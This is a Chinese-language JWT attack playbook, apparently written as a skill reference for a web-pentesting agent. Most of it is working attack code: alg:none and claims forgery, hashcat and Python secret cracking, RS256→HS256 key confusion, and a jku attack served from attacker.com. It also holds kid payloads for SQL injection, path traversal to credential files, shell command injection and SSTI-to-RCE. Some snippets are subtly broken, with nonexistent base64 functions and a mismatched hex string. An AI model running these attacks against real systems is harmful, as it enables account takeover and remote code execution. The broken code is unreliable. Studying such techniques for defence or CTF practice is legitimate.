# jwt-attack-methodology

> 来源: wgpsec/AboutSecurity (auth) | 融合进 skill-web


# JWT 攻击方法论

## Phase 1: 获取和解码 JWT
1. 登录获取 token（检查响应头 Set-Cookie 和响应体 JSON 字段）
2. 确认 JWT 格式：三段 Base64 由 `.` 分隔（Header.Payload.Signature）
3. 使用 jwt_decode 工具或 `echo '<part>' | base64 -d` 手动解码：
   - Header：检查 `alg` 字段（HS256/RS256/none）、`kid`/`jku`/`x5u` 参数
   - Payload：检查 `sub`、`role`、`admin`、`is_admin`、`user_id`、`exp` 等 Claims
   - 记录签名算法、过期时间、关键权限字段
4. 检查 token 是否过期：`exp` 字段转换为 Unix 时间戳对比当前时间
5. 对比不同用户的 JWT，找出权限相关字段的差异

## ⛔ 深入参考（发现 JWT 后必读）

- RS256→HS256 算法混淆、kid 注入（SQL/路径穿越/命令注入）、jku/x5u 替换 → [references/jwt-advanced.md](references/jwt-advanced.md)
- 弱密钥爆破完整工具链（hashcat/john/c-jwt-cracker/jwt_tool/Python + 弱密钥模式表） → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 2: None Algorithm 攻击
1. 将 Header 中 `alg` 改为 `none`，删除 Signature 部分（保留末尾的 `.`）
2. 重新 Base64 编码 Header 和 Payload，拼接为 `header.payload.`
3. 发送请求，观察服务端是否接受无签名 token
4. 尝试大小写变种绕过：`"none"`, `"None"`, `"NONE"`, `"nOnE"`, `"NoNe"`
5. 某些库只在 alg 为精确 `"none"` 时绕过，需逐个测试
```
原始: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
攻击: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

## Phase 3: 弱密钥爆破（HS256/HS384/HS512 专用）
1. 手动测试常见弱密钥：`secret`, `password`, `123456`, `key`, `jwt_secret`, `changeme`, `""`（空字符串）
2. 使用 hashcat 离线爆破：`hashcat -m 16500 jwt.txt wordlist.txt`
3. 使用 john：`john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256`
4. 轻量工具 c-jwt-cracker：`./jwtcrack <token>`（纯暴力，适合短密钥）
5. jwt_tool 综合工具：`python3 jwt_tool.py <token> -C -d wordlist.txt`
6. 知道密钥后伪造 token：
```python
import jwt; print(jwt.encode({'user':'admin','role':'admin'}, 'SECRET_KEY', algorithm='HS256'))
```
→ **完整爆破工具链和弱密钥模式表** → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 4: Claims 篡改
1. 解码 Payload，列出所有 Claims 字段
2. 修改权限相关字段：`role:user→admin` | `is_admin:false→true` | `user_id:5→1`
3. 尝试添加新字段：`"admin":true`、`"groups":["admin"]`
4. 修改 `exp` 延长 token 有效期（如改为 2099 年时间戳）
5. 使用已知密钥重新签名，替换原 token 发送请求
6. 对比响应确认权限是否提升（检查 HTTP 状态码、响应内容、可访问的端点）

## Phase 5: RS256→HS256 算法混淆
1. 确认服务端使用 RS256（非对称）算法签名
2. 获取公钥：请求 `/api/jwks`、`/.well-known/jwks.json`、`/oauth/jwks`
3. 将 Header 中 `alg` 从 `RS256` 改为 `HS256`
4. 使用 RS256 的公钥作为 HS256 的对称密钥签名 token
5. 发送篡改后的 token，利用服务端用公钥做 HMAC 验证的逻辑漏洞
→ 详细原理和脚本 → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 6: kid 参数注入
1. 检查 JWT Header 中是否存在 `kid`（Key ID）字段
2. SQL 注入：`"kid":"1' UNION SELECT 'my-key' -- "` → 用 `my-key` 签名
3. 路径穿越：`"kid":"../../dev/null"` → 用空文件内容作为密钥签名
4. 命令注入：`"kid":"key|cat /flag.txt"` → 某些实现会执行 shell 命令
5. SSRF：`"kid":"http://attacker.com/key"` → 从攻击者服务器获取密钥
→ 完整 payload → [references/jwt-advanced.md](references/jwt-advanced.md)



---

## REF: jwt-advanced

# JWT 高级攻击技术

## Table of Contents
- [RS256 → HS256 算法混淆](#rs256--hs256-算法混淆)
  - [完整攻击链](#完整攻击链)
  - [公钥提取脚本](#公钥提取脚本)
  - [pyjwt/node 库兼容格式](#pyjwtnode-库兼容格式)
- [jku/x5u URL 替换](#jkux5u-url-替换)
  - [完整 jku 攻击链](#完整-jku-攻击链)
  - [x5u 攻击变体](#x5u-攻击变体)
- [kid 参数注入](#kid-参数注入)
  - [SQL 注入变体](#sql-注入变体)
  - [路径穿越变体](#路径穿越变体)
  - [命令注入](#命令注入)
  - [SSTI 注入](#ssti-注入)
- [弱密钥爆破](#弱密钥爆破)
  - [hashcat 详细用法](#hashcat-详细用法)
  - [常见密钥词表](#常见密钥词表)
  - [Python 爆破脚本](#python-爆破脚本)
- [其他 JWT 攻击面](#其他-jwt-攻击面)
  - [alg: none 变体](#alg-none-变体)
  - [aud 字段 Claims 注入](#aud-字段-claims-注入)
  - [jti 字段重复使用攻击](#jti-字段重复使用攻击)
  - [时间戳攻击](#时间戳攻击)

---

## RS256 → HS256 算法混淆

### 原理

RS256 (RSA Signature) 使用**私钥**签名、公钥验证。HS256 (HMAC) 双方共享同一密钥。

攻击条件：服务端用 RS256 且**不验证 `alg` 字段**（只验证签名），将 `alg` 改为 `HS256` 后，服务端会用收到的**公钥作为 HMAC 密钥**验证签名。攻击者持有公钥，可生成有效签名。

### 完整攻击链

**Step 1: 获取公钥**

常见路径：
```
/api/jwks
/.well-known/jwks.json
/.well-known/openid-configuration
/public.pem
/api/auth/public_key
```

JWKS 格式：
```json
{"keys":[{"kty":"RSA","use":"sig","kid":"key-id","n":"...","e":"AQAB"}]}
```

**Step 2: 提取公钥为 PEM 格式**

```python
import json
import base64
from Crypto.PublicKey import RSA

jwks = json.loads(open('jwks.json').read())
key = jwks['keys'][0]

# Extract n and e
n = int.from_bytes(base64.urlsafe_decode(key['n']), 'big')
e = int.from_bytes(base64.urlsafe_decode(key['e']), 'big')

# Build RSA key
rsa_key = RSA.construct((n, e))
pem = rsa_key.export_key()
open('/tmp/public.pem', 'wb').write(pem)
print(pem.decode())
```

**Step 3: 生成伪造 Token**

```python
import jwt

pubkey = open('/tmp/public.pem').read()
# Remove headers from PEM for pyjwt compatibility
pubkey_clean = pubkey.replace('-----BEGIN PUBLIC KEY-----\n', '').replace('\n-----END PUBLIC KEY-----\n', '')

payload = {
    'user': 'admin',
    'role': 'admin',
    'exp': 9999999999
}
# Sign with HS256 using the PUBLIC key as HMAC secret
token = jwt.encode(payload, pubkey_clean, algorithm='HS256')
print(token)
```

**Step 4: 验证**

```python
import jwt
# If you have the private key (attacker-generated), you can also sign with it
# But the trick is: public key becomes the HMAC secret
result = jwt.decode(token, pubkey_clean, algorithms=['HS256'])
print(result)
```

### 公钥提取脚本

```python
#!/usr/bin/env python3
import requests
import json
import base64
from Crypto.PublicKey import RSA

def fetch_jwks(url):
    r = requests.get(url)
    return r.json()

def jwks_to_pem(jwks, kid=None):
    for key in jwks['keys']:
        if kid and key.get('kid') != kid:
            continue
        n = int.from_bytes(base64.urlsafe_decode(key['n']), 'big')
        e = int.from_bytes(base64.urlsafe_decode(key['e']), 'big')
        rsa = RSA.construct((n, e))
        return rsa.export_key()
    return None

# Try common JWKS endpoints
endpoints = [
    'https://target/.well-known/jwks.json',
    'https://target/api/jwks',
    'https://target/auth/public_key',
]
for url in endpoints:
    try:
        jwks = fetch_jwks(url)
        pem = jwks_to_pem(jwks)
        if pem:
            print(f"[+] Found key at {url}")
            open('/tmp/public.pem', 'wb').write(pem)
            break
    except:
        continue
```

### pyjwt/node 库兼容格式

pyjwt 接受 PEM 字符串作为密钥，但格式需严格匹配：

```python
# Correct format for pyjwt
import jwt
pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""
# Must include header/footer and newlines
token = jwt.encode({'user': 'admin'}, pubkey, algorithm='HS256')
```

若 PEM 格式不对，尝试：
```python
# Try removing header/footer for some implementations
pubkey_clean = pubkey.replace('-----BEGIN PUBLIC KEY-----', '').replace('-----END PUBLIC KEY-----', '').replace('\n', '')
token = jwt.encode({'user': 'admin'}, pubkey_clean, algorithm='HS256')
```

---

## jku/x5u URL 替换

### 原理

`jku` (JWK Set URL) 或 `x5u` (X.509 URL) 告诉服务端去哪获取公钥验证签名。若不验证这些 URL 的域名，攻击者可指向自己的服务器，返回攻击者公钥对应的私钥签名。

### 完整 jku 攻击链

**Step 1: 生成 RSA 密钥对**

```python
from Crypto.PublicKey import RSA
key = RSA.generate(2048)
private_pem = key.export_key()
public_pem = key.publickey().export_key()
open('/tmp/attacker_private.pem', 'wb').write(private_pem)
open('/tmp/attacker_public.pem', 'wb').write(public_pem)
```

**Step 2: 构造 JWK Set 指向攻击者公钥**

```python
import json
import base64

def pem_to_jwk(pem):
    from Crypto.PublicKey import RSA
    key = RSA.import_key(pem)
    # Get n and e
    n_bytes = key.n.to_bytes(key.key_size // 8, 'big')
    e_bytes = key.e.to_bytes((key.e.bit_length() + 7) // 8, 'big')
    return {
        'kty': 'RSA',
        'use': 'sig',
        'kid': 'attacker-key',
        'n': base64.urlsafe_encode(n_bytes).rstrip(b'=').decode(),
        'e': base64.urlsafe_encode(e_bytes).rstrip(b'=').decode(),
    }

jwks = {'keys': [pem_to_jwk(open('/tmp/attacker_public.pem').read())]}
open('/tmp/jwks.json', 'w').write(json.dumps(jwks))
```

**Step 3: 启动 HTTP 服务器**

```bash
python3 -m http.server 8080 --directory /tmp
# Serve jwks.json at http://attacker.com/jwks.json
```

**Step 4: 构造伪造 Token**

```python
import jwt
import json

private_key = open('/tmp/attacker_private.pem').read()
payload = {'user': 'admin', 'role': 'admin'}
# Build header with jku pointing to attacker server
header = {
    'alg': 'RS256',
    'typ': 'JWT',
    'jku': 'http://attacker.com:8080/jwks.json',
    'kid': 'attacker-key'
}
token = jwt.encode(payload, private_key, algorithm='RS256', headers=header)
print(token)
```

**Step 5: 发送伪造 Token**

```python
import requests
requests.get('https://target/api/admin', headers={'Authorization': f'Bearer {token}'})
```

### x5u 攻击变体

`x5u` 指向 X.509 证书链（DER 格式），比 `jku` 更难构造。常见场景用 `jku` 即可。

若需要 x5u：
```python
# Convert PEM to DER for x5u
from cryptography import x509
import base64

cert_pem = open('/tmp/attacker_cert.pem').read()
cert_der = x509.load_pem_x509_certificate(cert_pem.encode()).public_bytes(
    encoding=x509.base.Encoding.DER
)
open('/tmp/cert.der', 'wb').write(cert_der)
# Serve at http://attacker.com/cert.der
```

---

## kid 参数注入

### SQL 注入变体

**基础 SQL 注入：**
```json
{"alg":"HS256","kid":"1' UNION SELECT 'my-secret-key' -- "}
```

**绕过引号过滤（无引号）：**
```json
{"alg":"HS256","kid":"1 UNION SELECT 0x6d792d7365637265742d6b6579 -- "}
```
（0x6d792d7365637265742b6b6579 = `my-secret-key` hex）

**Error-based SQL 注入（kid 位置）：**
```json
{"alg":"HS256","kid":"1' AND 1=EXTRACTVALUE(0,CONCAT(0x7e,(SELECT secret FROM users LIMIT 1))) -- "}
```

**SQLi 获取密钥（利用已知 kid 注入点）：**
```json
{"alg":"HS256","kid":"test' UNION SELECT key FROM jwt_keys WHERE id='1"}
```

### 路径穿越变体

```json
{"alg":"HS256","kid":"../../etc/passwd"}
```
读取文件内容作为密钥（空文件 = 空密钥）

```json
{"alg":"HS256","kid":"../../dev/null"}
```
`/dev/null` 读取为空，HMAC 密钥为空字符串。

```python
# 空密钥签名
import jwt
token = jwt.encode({'role': 'admin'}, '', algorithm='HS256')
print(token)
```

```json
{"alg":"HS256","kid":"../../home/user/.ssh/id_rsa"}
```
若服务进程有权限读取 SSH 私钥。

### 命令注入

```json
{"alg":"HS256","kid":"key; cat /flag.txt > /tmp/pwned; echo"}
```
某些实现会执行 `system()` 读取密钥文件。

**更隐蔽的命令注入（base64 编码）：**
```json
{"alg":"HS256","kid":"key|base64 -d > /tmp/k; chmod +x /tmp/k; /tmp/k"}
```

### SSTI 注入

部分 JWT 库对 kid 做模板渲染（Flask/Jinja2）：
```json
{"alg":"HS256","kid":"{{7*7}}"}
```
若返回 49，说明存在 SSTI，可直接 RCE：
```json
{"alg":"HS256","kid":"{{lipsum.__globals__.__import__('os').popen('cat /flag').read()}}"}
```

---

## 弱密钥爆破

只有 HMAC 系列（HS256/HS384/HS512）才能爆破，RS256/ES256 无法爆破。

### 工具选择决策

| 工具 | 速度 | 适用场景 | 安装 |
|------|------|----------|------|
| **hashcat** (GPU) | ⚡⚡⚡⚡⚡ | 大字典、GPU 可用 | `apt install hashcat` |
| **c-jwt-cracker** | ⚡⚡⚡⚡ | 短密钥暴力枚举 (1-6位) | `git clone + make` |
| **john** | ⚡⚡⚡ | CPU 爆破、规则变换 | `apt install john` |
| **jwt_tool** | ⚡⚡ | 集成化、附带弱密钥表 | `pip install jwt-tool` |
| **Python 脚本** | ⚡ | 自定义逻辑、特殊字典 | 内置 |

**推荐顺序**：先 hashcat 大字典 → 失败则 c-jwt-cracker 短密钥枚举 → 最后 Python 自定义。
5 分钟内大字典无结果 → 密钥可能是强随机生成的 → 换其他攻击面（none/kid/jku）。

### hashcat 详细用法

```bash
# Step 1: 保存完整 JWT token 到文件（JWT hash mode = 16500）
echo 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE' > /tmp/jwt.txt

# Step 2: 字典爆破（首选）
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --force

# Step 3: 查看结果
hashcat -m 16500 /tmp/jwt.txt --show

# 纯数字密钥 (1-8位)
hashcat -m 16500 /tmp/jwt.txt -a 3 '?d?d?d?d?d?d?d?d' --increment

# 小写字母 (1-6位)
hashcat -m 16500 /tmp/jwt.txt -a 3 '?l?l?l?l?l?l' --increment

# 混合：小写+数字 (1-6位)
hashcat -m 16500 /tmp/jwt.txt -a 3 -1 '?l?d' '?1?1?1?1?1?1' --increment

# 规则变换（leetspeak、大小写变体）
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 指定 JWT 专用字典
hashcat -m 16500 /tmp/jwt.txt /usr/share/seclists/Passwords/jwt-secrets.txt
```

### john the ripper

```bash
john /tmp/jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
john /tmp/jwt.txt --show --format=HMAC-SHA256
john /tmp/jwt.txt --incremental=lower --format=HMAC-SHA256
```

### c-jwt-cracker（短密钥极速枚举）

纯 C 实现，适合 1-6 位纯字符密钥：

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker.git
cd c-jwt-cracker && make
./jwtcrack 'TOKEN'
# 指定字符集和最大长度
./jwtcrack 'TOKEN' abcdefghijklmnopqrstuvwxyz0123456789 8
```

### jwt_tool

```bash
pip3 install jwt-tool
jwt_tool 'TOKEN' -C -d /usr/share/wordlists/rockyou.txt
```

### 常见弱密钥模式

| 模式 | 例子 | 破解方法 |
|------|------|----------|
| 空字符串 | `""` | Python 直接试 |
| 常见单词 | `secret`, `password`, `key`, `changeme` | 弱密钥列表 |
| 短随机串 | `a1b2`, `xyz` | c-jwt-cracker 枚举 |
| 纯数字 | `123456`, `000000` | hashcat mask `?d*` |
| 项目名/域名 | `myapp`, `target.com` | 手动收集+字典 |
| 框架默认 | Django `django-insecure-...` | 手动尝试 |
| UUID 格式 | `550e8400-e29b-...` | 不可爆破，换攻击面 |

### Python 爆破脚本

```python
#!/usr/bin/env python3
import jwt
import sys
import os

TOKEN = sys.argv[1] if len(sys.argv) > 1 else 'YOUR_TOKEN_HERE'

# 常见弱密钥（优先尝试）
WEAK_SECRETS = [
    '', 'secret', 'password', '123456', 'key', 'jwt_secret',
    'changeme', 'test', 'admin', 'root', 'token', 'pass',
    'secret_key', 'secretkey', 'private_key', 'jwt-key',
    'api_key', 'api-key', 'default', 'null', 'undefined',
    'super_secret', 'mysecret', 'mykey', 'hmac_secret',
    '1234567890', 'qwerty', 'abc123', 'iloveyou',
]

for s in WEAK_SECRETS:
    try:
        jwt.decode(TOKEN, s, algorithms=['HS256', 'HS384', 'HS512'])
        print(f"[+] SECRET FOUND: '{s}'")
        sys.exit(0)
    except jwt.InvalidSignatureError:
        continue
    except Exception:
        continue

# 字典文件爆破
wordlists = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/seclists/Passwords/jwt-secrets.txt',
    '/pentest/AboutSecurity/Dic/Web/jwt-secrets.txt',
]
for wl in wordlists:
    if os.path.exists(wl):
        print(f"[*] Trying wordlist: {wl}")
        for line in open(wl, errors='ignore'):
            s = line.strip()
            try:
                jwt.decode(TOKEN, s, algorithms=['HS256', 'HS384', 'HS512'])
                print(f"[+] SECRET FOUND: '{s}'")
                sys.exit(0)
            except:
                continue

print("[-] Secret not found in all wordlists")
```

### 爆破成功后伪造 Token

```python
import jwt

SECRET = 'cracked_secret'
payload = {'user': 'admin', 'role': 'admin', 'is_admin': True, 'sub': '1'}
token = jwt.encode(payload, SECRET, algorithm='HS256')
print(f"Forged token: {token}")
```

```bash
curl -H "Authorization: Bearer FORGED_TOKEN" http://target/api/admin
curl -b "token=FORGED_TOKEN" http://target/dashboard
```

---

## 其他 JWT 攻击面

### alg: none 变体

```python
import jwt
# 多种变体
algs = ['none', 'None', 'NONE', 'nOnE', 'NoNe']
for alg in algs:
    try:
        token = jwt.encode({'user': 'admin'}, '', algorithm=alg)
        print(f"{alg}: {token}")
    except:
        pass
```

### aud 字段 Claims 注入

若 Token 的 `aud`（Audience）字段被验证：
```python
# 尝试添加 aud
payload = {'user': 'admin', 'aud': 'admin-api'}
token = jwt.encode(payload, secret, algorithm='HS256')

# 或尝试移除 aud 约束
# 在 Token 中删除 aud 字段
```

### jti 字段重复使用攻击

某些实现未验证 `jti`（JWT ID）的唯一性：
```python
# 复制一个已使用的 Token（如果 jti 未被正确验证）
# 适用于 token reuse 场景
```

### 时间戳攻击

```python
import jwt
import time

payload = {
    'user': 'admin',
    'exp': int(time.time()) + 86400,  # 未来过期
    'iat': int(time.time()) - 10        # 过去签发
}
token = jwt.encode(payload, secret, algorithm='HS256')

# 如果服务端只检查 exp 是否在当前时间之前，但不检查 iat 是否合理
# 可尝试让 iat 在未来，exp 在更远的未来
```

---

## 注意事项

- **算法混淆成功 ≠ 一定有漏洞** — 需确认公钥确实用于 HS256 验证
- **jku/x5u 需要公网可达服务器** — CTF 环境中需确认靶机能否访问外网
- **kid 注入依赖实现** — 并非所有库都会把 kid 当文件路径或 SQL 输入
- **hashcat 爆破失败常见原因** — token 不是 HS256、密钥词表不够大、格式问题
